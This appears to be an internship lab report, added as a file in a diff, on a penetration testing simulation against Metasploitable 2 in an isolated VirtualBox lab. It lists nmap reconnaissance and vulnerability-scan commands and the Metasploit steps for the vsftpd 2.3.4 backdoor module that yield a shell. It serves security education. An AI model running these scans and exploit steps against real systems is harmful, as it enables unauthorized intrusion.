@@ -1,0 +1,161 @@
+Task 4 – Penetration Testing Simulation
+
+VirtualWorks Lab – Ethical Hacking Internship
+
+1. Objective
+
+The objective of this task is to perform a controlled penetration testing simulation in a safe virtual lab environment. The exercise focuses on identifying system vulnerabilities, conducting network reconnaissance, scanning open ports, analyzing security weaknesses, and understanding basic exploitation techniques.
+
+2. Tools and Technologies Used
+
+Tool| Purpose
+Kali Linux| Penetration testing operating system
+Oracle VirtualBox| Virtual lab environment
+Metasploitable 2| Intentionally vulnerable target machine
+Nmap| Network reconnaissance and port scanning
+Metasploit Framework| Vulnerability exploitation framework
+
+3. Lab Environment Setup
+
+A controlled virtual lab consists of two virtual machines:
+
+- Attacker Machine: Kali Linux
+- Target Machine: Metasploitable 2
+
+Both machines are configured using a Host-only Network in VirtualBox to isolate the experiment from external networks.
+
+Network Configuration:
+
+- Attacker: Kali Linux
+- Target: Metasploitable 2
+- Network: Host-only Adapter
+
+4. Practical Implementation
+
+Step 1: Reconnaissance
+
+Reconnaissance is the initial phase of penetration testing. It involves collecting information about the target machine.
+
+The following command is used to check network connectivity:
+
+ping -c 4 TARGET_IP
+
+This helps verify whether the target machine is reachable.
+
+Step 2: Network Scanning
+
+Nmap is used to identify open ports and running services on the target machine.
+
+Command:
+
+nmap -sV TARGET_IP
+
+Purpose:
+
+- Identify open ports.
+- Detect running services.
+- Determine service versions.
+- Understand the target's network exposure.
+
+Step 3: Vulnerability Scanning
+
+A vulnerability scan is performed to identify potential weaknesses in the target system.
+
+Command:
+
+nmap -sV -sC --script vuln TARGET_IP
+
+This scan helps identify known security weaknesses and potentially vulnerable services.
+
+Step 4: Basic Exploitation
+
+Metasploit Framework is used to study the exploitation of a deliberately vulnerable FTP service in Metasploitable 2.
+
+Start Metasploit:
+
+msfconsole
+
+Search for the vulnerable FTP service:
+
+search vsftpd 2.3.4
+
+Select the appropriate lab module:
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+Configure the target:
+
+set RHOSTS TARGET_IP
+
+Review the module configuration:
+
+show options
+
+Check the target where supported:
+
+check
+
+Execute the test against the isolated vulnerable machine:
+
+run
+
+If a shell is obtained, basic system information can be checked using:
+
+whoami
+hostname
+id
+
+This demonstrates how an outdated and vulnerable service can potentially expose a system to unauthorized access.
+
+5. Vulnerability Assessment and Observations
+
+The following security aspects are examined during the simulation:
+
+Assessment Area| Expected Observation
+Network reconnaissance| Target connectivity
+Port scanning| Open network ports
+Service detection| Running services and versions
+Vulnerability assessment| Potentially vulnerable services
+Exploitation testing| Whether the selected vulnerability is exploitable
+Security analysis| Possible impact of identified weaknesses
+
+Note: Actual scan findings and exploitation results must be recorded from the lab execution.
+
+6. Security Risks Identified
+
+The simulation demonstrates several potential security risks:
+
+1. Outdated services may contain known vulnerabilities.
+2. Unnecessary open ports increase the attack surface.
+3. Weak authentication can allow unauthorized access.
+4. Unpatched software may expose systems to exploitation.
+5. Insufficient network restrictions can increase security risks.
+
+7. Security Recommendations
+
+The following measures help improve system security:
+
+- Regularly update operating systems and software.
+- Disable unnecessary network services.
+- Close unused ports.
+- Implement strong password policies.
+- Configure firewalls and network access controls.
+- Monitor network traffic and system logs.
+- Conduct periodic vulnerability assessments.
+- Apply security patches promptly.
+
+8. Conclusion
+
+This penetration testing simulation provides practical exposure to ethical hacking methodologies in a controlled virtual environment.
+
+Through this exercise, the reconnaissance, network scanning, vulnerability assessment, and basic exploitation phases of penetration testing are explored.
+
+The task highlights the importance of identifying security weaknesses before malicious attackers can exploit them. It also demonstrates how tools such as Kali Linux, Nmap, and Metasploit support security testing and vulnerability management.
+
+9. Ethical Considerations
+
+All testing activities are intended for educational purposes and must be performed only on authorized systems within the isolated virtual lab environment.
+
+No real-world systems, websites, or networks are targeted without explicit permission.
+
+---
